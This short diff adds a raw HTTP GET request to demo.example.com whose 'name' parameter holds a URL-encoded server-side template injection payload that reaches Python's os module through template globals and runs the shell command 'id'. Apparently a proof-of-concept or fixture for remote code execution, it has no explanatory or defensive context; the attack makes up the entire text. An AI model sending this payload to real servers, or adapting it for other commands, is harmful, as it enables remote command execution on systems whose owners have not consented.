@@ -1,0 +1,4 @@
+GET /a?name=%7B%7Bself.__init__.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29%7D%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
